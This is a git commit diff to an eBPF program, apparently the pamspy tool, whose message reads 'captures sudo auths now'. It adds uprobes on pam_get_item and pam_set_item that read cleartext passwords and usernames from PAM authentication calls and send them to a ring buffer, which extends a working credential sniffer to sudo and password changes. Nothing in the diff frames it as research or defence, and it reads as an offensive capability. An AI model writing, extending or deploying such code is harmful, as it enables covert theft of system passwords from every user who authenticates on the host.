745eb22fcd4c9a89667e5c1419b39ede407fc286
ellen.freeman <ellen.freeman>
2026-02-19 11:44:24 -0500

    captures sudo auths now

--- src/pamspy.bpf.c
+++ src/pamspy.bpf.c
@@ -36,6 +36,7 @@ typedef struct pam_handle_s
 struct pam_context_t {
     pam_handle_t *pamh;
     u64 item;
+    u64 item_ptr;
 };
 
 /******************************************************************************/
@@ -77,6 +78,7 @@ int get_addr_pam_get_authtok(struct pt_regs *ctx)
   struct pam_context_t ctx_data = {};
   ctx_data.pamh = (pam_handle_t*)PT_REGS_PARM1(ctx);
   ctx_data.item = (u64)PT_REGS_PARM2(ctx);
+  ctx_data.item_ptr = 0; // Not used for get_authtok
 
   // Get current PID to track
   u32 pid = bpf_get_current_pid_tgid() >> 32;
@@ -137,3 +139,109 @@ int trace_pam_get_authtok(struct pt_regs *ctx)
 
   return 0;
 };
+
+/*
+ *  int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item);
+ */
+SEC("uprobe/pam_get_item")
+int get_addr_pam_get_item(struct pt_regs *ctx)
+{
+  if (!PT_REGS_PARM1(ctx))
+    return 0;
+
+  struct pam_context_t ctx_data = {};
+  ctx_data.pamh = (pam_handle_t*)PT_REGS_PARM1(ctx);
+  ctx_data.item = (u64)PT_REGS_PARM2(ctx);
+  ctx_data.item_ptr = (u64)PT_REGS_PARM3(ctx);
+
+  u32 pid = bpf_get_current_pid_tgid() >> 32;
+  bpf_map_update_elem(&pam_handle_t_map, &pid, &ctx_data, BPF_ANY);
+
+  return 0;
+}
+
+SEC("uretprobe/pam_get_item")
+int trace_pam_get_item(struct pt_regs *ctx)
+{
+  pam_handle_t *phandle = 0;
+  u64 item = 0;
+  u64 item_ptr = 0;
+
+  u32 pid = bpf_get_current_pid_tgid() >> 32;
+  struct pam_context_t *ctx_data = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
+  if (!ctx_data)
+    return 0;
+
+  phandle = ctx_data->pamh;
+  item = ctx_data->item;
+  item_ptr = ctx_data->item_ptr;
+
+  bpf_map_delete_elem(&pam_handle_t_map, &pid);
+
+  if (item != PAM_AUTHTOK && item != PAM_OLDAUTHTOK)
+      return 0;
+
+  if (!item_ptr)
+      return 0;
+
+  u64 password_addr = 0;
+  // Read the pointer value from item_ptr (which is void**)
+  bpf_probe_read(&password_addr, sizeof(password_addr), (void*)item_ptr);
+
+  if (!password_addr)
+      return 0;
+
+  u64 username_addr = 0;
+  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
+
+  event_t *e;
+  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
+  if (e)
+  {
+    e->pid = pid;
+    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
+    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
+    bpf_get_current_comm(&e->comm, sizeof(e->comm));
+    bpf_ringbuf_submit(e, 0);
+  }
+
+  return 0;
+}
+
+/*
+ *  int pam_set_item(pam_handle_t *pamh, int item_type, const void *item);
+ */
+SEC("uprobe/pam_set_item")
+int trace_pam_set_item(struct pt_regs *ctx)
+{
+  if (!PT_REGS_PARM1(ctx))
+    return 0;
+
+  pam_handle_t *phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);
+  u64 item = (u64)PT_REGS_PARM2(ctx);
+  u64 password_addr = (u64)PT_REGS_PARM3(ctx);
+
+  if (item != PAM_AUTHTOK && item != PAM_OLDAUTHTOK)
+      return 0;
+      
+  if (!password_addr)
+      return 0;
+
+  u32 pid = bpf_get_current_pid_tgid() >> 32;
+
+  u64 username_addr = 0;
+  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
+
+  event_t *e;
+  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
+  if (e)
+  {
+    e->pid = pid;
+    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
+    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
+    bpf_get_current_comm(&e->comm, sizeof(e->comm));
+    bpf_ringbuf_submit(e, 0);
+  }
+
+  return 0;
+}
